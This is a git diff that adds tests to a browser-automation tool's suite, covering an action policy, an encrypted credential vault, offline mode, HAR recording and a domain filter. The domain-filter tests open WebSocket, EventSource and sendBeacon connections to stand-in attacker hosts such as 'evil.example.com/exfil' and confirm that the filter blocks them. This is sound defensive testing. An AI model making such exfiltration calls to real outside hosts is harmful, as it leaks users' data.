@@ -13,8 +13,14 @@ import { startTestServer } from './test-server';
 import { BrowserManager } from '../src/browser-manager';
 import { handleReadCommand } from '../src/commands/read';
 import { handleWriteCommand } from '../src/commands/write';
+import { handleMetaCommand } from '../src/commands/meta';
 import { DomainFilter } from '../src/domain-filter';
+import { PolicyChecker } from '../src/policy';
+import { AuthVault } from '../src/auth-vault';
+import { formatAsHar } from '../src/har';
 import { loadConfig } from '../src/config';
+import * as fs from 'fs';
+import * as path from 'path';
 
 let testServer: ReturnType<typeof startTestServer>;
 let bm: BrowserManager;
@@ -281,5 +287,277 @@ describe('DomainFilter integration', () => {
     expect(filter.isAllowed('https://second.com/b')).toBe(true);
     expect(filter.isAllowed('https://sub.third.com/c')).toBe(true);
     expect(filter.isAllowed('https://fourth.com/d')).toBe(false);
+  });
+});
+
+// ─── Action Policy ──────────────────────────────────────────────
+
+describe('PolicyChecker', () => {
+  const tmpDir = '/tmp/browse-test-policy';
+  const policyPath = `${tmpDir}/test-policy.json`;
+
+  beforeAll(() => {
+    fs.mkdirSync(tmpDir, { recursive: true });
+  });
+
+  afterAll(() => {
+    try { fs.rmSync(tmpDir, { recursive: true }); } catch {}
+  });
+
+  test('no policy file = all allowed', () => {
+    const checker = new PolicyChecker('/tmp/nonexistent-policy-file.json');
+    expect(checker.check('goto')).toBe('allow');
+    expect(checker.check('click')).toBe('allow');
+  });
+
+  test('deny takes priority over allow', () => {
+    fs.writeFileSync(policyPath, JSON.stringify({
+      default: 'allow',
+      deny: ['goto'],
+      allow: ['goto', 'click'],
+    }));
+    const checker = new PolicyChecker(policyPath);
+    expect(checker.check('goto')).toBe('deny');
+    expect(checker.check('click')).toBe('allow');
+  });
+
+  test('confirm takes priority over allow', () => {
+    fs.writeFileSync(policyPath, JSON.stringify({
+      default: 'allow',
+      confirm: ['fill'],
+      allow: ['fill', 'click'],
+    }));
+    const checker = new PolicyChecker(policyPath);
+    expect(checker.check('fill')).toBe('confirm');
+    expect(checker.check('click')).toBe('allow');
+  });
+
+  test('default deny blocks unlisted commands', () => {
+    fs.writeFileSync(policyPath, JSON.stringify({
+      default: 'deny',
+      allow: ['text', 'snapshot'],
+    }));
+    const checker = new PolicyChecker(policyPath);
+    expect(checker.check('text')).toBe('allow');
+    expect(checker.check('snapshot')).toBe('allow');
+    expect(checker.check('goto')).toBe('deny');
+    expect(checker.check('click')).toBe('deny');
+  });
+
+  test('hot-reload picks up file changes', async () => {
+    fs.writeFileSync(policyPath, JSON.stringify({ default: 'allow' }));
+    const checker = new PolicyChecker(policyPath);
+    expect(checker.check('goto')).toBe('allow');
+
+    // Ensure mtime changes (filesystem may have 1s resolution)
+    await Bun.sleep(10);
+    const futureTime = Date.now() + 2000;
+    fs.writeFileSync(policyPath, JSON.stringify({ default: 'allow', deny: ['goto'] }));
+    fs.utimesSync(policyPath, new Date(futureTime), new Date(futureTime));
+    expect(checker.check('goto')).toBe('deny');
+  });
+});
+
+// ─── AuthVault ──────────────────────────────────────────────────
+
+describe('AuthVault', () => {
+  const tmpDir = '/tmp/browse-test-auth';
+
+  beforeAll(() => {
+    fs.mkdirSync(tmpDir, { recursive: true });
+    // Set a test encryption key
+    process.env.BROWSE_ENCRYPTION_KEY = 'a'.repeat(64);
+  });
+
+  afterAll(() => {
+    delete process.env.BROWSE_ENCRYPTION_KEY;
+    try { fs.rmSync(tmpDir, { recursive: true }); } catch {}
+  });
+
+  test('save and list credentials (password hidden)', () => {
+    const vault = new AuthVault(tmpDir);
+    vault.save('test-site', 'https://example.com/login', 'user@test.com', 'secret123');
+
+    const list = vault.list();
+    expect(list.length).toBe(1);
+    expect(list[0].name).toBe('test-site');
+    expect(list[0].url).toBe('https://example.com/login');
+    expect(list[0].username).toBe('user@test.com');
+    expect(list[0].hasPassword).toBe(true);
+    // Password should NOT be in the list output
+    expect(JSON.stringify(list)).not.toContain('secret123');
+  });
+
+  test('encrypt/decrypt roundtrip', () => {
+    const vault = new AuthVault(tmpDir);
+    vault.save('roundtrip', 'https://test.com', 'user', 'myP@ssw0rd!');
+
+    // Read the raw file to verify it's encrypted
+    const raw = JSON.parse(fs.readFileSync(`${tmpDir}/auth/roundtrip.json`, 'utf-8'));
+    expect(raw.encrypted).toBe(true);
+    expect(raw.data).not.toContain('myP@ssw0rd!');
+    expect(raw.iv).toBeDefined();
+    expect(raw.authTag).toBeDefined();
+  });
+
+  test('delete credential', () => {
+    const vault = new AuthVault(tmpDir);
+    vault.save('to-delete', 'https://test.com', 'user', 'pass');
+    expect(vault.list().find(c => c.name === 'to-delete')).toBeDefined();
+
+    vault.delete('to-delete');
+    expect(vault.list().find(c => c.name === 'to-delete')).toBeUndefined();
+  });
+
+  test('delete non-existent credential throws', () => {
+    const vault = new AuthVault(tmpDir);
+    expect(() => vault.delete('nonexistent')).toThrow('not found');
+  });
+});
+
+// ─── Offline mode ───────────────────────────────────────────────
+
+describe('Offline mode', () => {
+  test('offline on blocks network, offline off restores', async () => {
+    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
+
+    // Turn offline on
+    const onResult = await handleWriteCommand('offline', ['on'], bm);
+    expect(onResult).toContain('ON');
+
+    // Navigation should fail
+    try {
+      await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
+      expect(true).toBe(false); // should not reach
+    } catch (err: any) {
+      expect(err.message).toBeTruthy();
+    }
+
+    // Turn offline off
+    const offResult = await handleWriteCommand('offline', ['off'], bm);
+    expect(offResult).toContain('OFF');
+
+    // Navigation should work again
+    const result = await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
+    expect(result).toContain('Navigated to');
+  });
+
+  test('offline toggle works', async () => {
+    const r1 = await handleWriteCommand('offline', [], bm);
+    expect(r1).toContain('ON');
+    const r2 = await handleWriteCommand('offline', [], bm);
+    expect(r2).toContain('OFF');
+  });
+});
+
+// ─── HAR recording ──────────────────────────────────────────────
+
+describe('HAR recording', () => {
+  test('formatAsHar produces valid HAR 1.2 structure', () => {
+    const entries = [
+      { timestamp: 1000, method: 'GET', url: 'https://example.com/page?q=test', status: 200, duration: 150, size: 5000 },
+      { timestamp: 2000, method: 'POST', url: 'https://example.com/api', status: 201, duration: 80, size: 100 },
+      { timestamp: 500, method: 'GET', url: 'https://example.com/early', status: 200, duration: 50, size: 300 },
+    ];
+
+    const har = formatAsHar(entries, 900) as any;
+    expect(har.log.version).toBe('1.2');
+    expect(har.log.creator.name).toBe('@ulpi/browse');
+    // Should exclude the entry at timestamp 500 (before startTime 900)
+    expect(har.log.entries.length).toBe(2);
+    expect(har.log.entries[0].request.method).toBe('GET');
+    expect(har.log.entries[0].request.url).toBe('https://example.com/page?q=test');
+    expect(har.log.entries[0].request.queryString).toEqual([{ name: 'q', value: 'test' }]);
+    expect(har.log.entries[0].response.status).toBe(200);
+    expect(har.log.entries[1].request.method).toBe('POST');
+  });
+
+  test('har start/stop via BrowserManager', async () => {
+    expect(bm.getHarRecording()).toBeNull();
+
+    bm.startHarRecording();
+    expect(bm.getHarRecording()).not.toBeNull();
+    expect(bm.getHarRecording()!.active).toBe(true);
+
+    const recording = bm.stopHarRecording();
+    expect(recording).not.toBeNull();
+    expect(bm.getHarRecording()).toBeNull();
+  });
+});
+
+// ─── WebSocket/EventSource/sendBeacon domain filter ─────────
+
+describe('DomainFilter init script', () => {
+  test('generateInitScript returns JS that wraps WebSocket, EventSource, sendBeacon', () => {
+    const filter = new DomainFilter(['example.com']);
+    const script = filter.generateInitScript();
+    expect(script).toContain('WebSocket');
+    expect(script).toContain('EventSource');
+    expect(script).toContain('sendBeacon');
+    expect(script).toContain('example.com');
+  });
+
+  // Shared filtered BrowserManager for all init script tests
+  let filteredBm: BrowserManager;
+
+  beforeAll(async () => {
+    filteredBm = new BrowserManager();
+    await filteredBm.launch();
+    const filter = new DomainFilter(['127.0.0.1']);
+    const ctx = filteredBm.getContext()!;
+    await ctx.addInitScript(filter.generateInitScript());
+    await filteredBm.getPage().goto(baseUrl + '/basic.html', { waitUntil: 'domcontentloaded' });
+  });
+
+  afterAll(async () => {
+    await Promise.race([
+      filteredBm.close().catch(() => {}),
+      new Promise(resolve => setTimeout(resolve, 3000)),
+    ]);
+  });
+
+  test('WebSocket to blocked domain throws in page context', async () => {
+    const result = await filteredBm.getPage().evaluate(() => {
+      try {
+        new WebSocket('ws://evil.example.com/exfil');
+        return 'no-error';
+      } catch (e: any) {
+        return e.message;
+      }
+    });
+    expect(result).toContain('blocked by domain filter');
+    expect(result).toContain('evil.example.com');
+  });
+
+  test('WebSocket to allowed domain does NOT throw', async () => {
+    const result = await filteredBm.getPage().evaluate(() => {
+      try {
+        const ws = new WebSocket('ws://127.0.0.1:9999/test');
+        ws.close();
+        return 'allowed';
+      } catch (e: any) {
+        return 'blocked: ' + e.message;
+      }
+    });
+    expect(result).toBe('allowed');
+  });
+
+  test('EventSource to blocked domain throws in page context', async () => {
+    const result = await filteredBm.getPage().evaluate(() => {
+      try {
+        new EventSource('https://evil.tracker.com/stream');
+        return 'no-error';
+      } catch (e: any) {
+        return e.message;
+      }
+    });
+    expect(result).toContain('blocked by domain filter');
+  });
+
+  test('sendBeacon to blocked domain returns false', async () => {
+    const result = await filteredBm.getPage().evaluate(() => {
+      return navigator.sendBeacon('https://tracker.evil.com/ping', 'data');
+    });
+    expect(result).toBe(false);
   });
 });
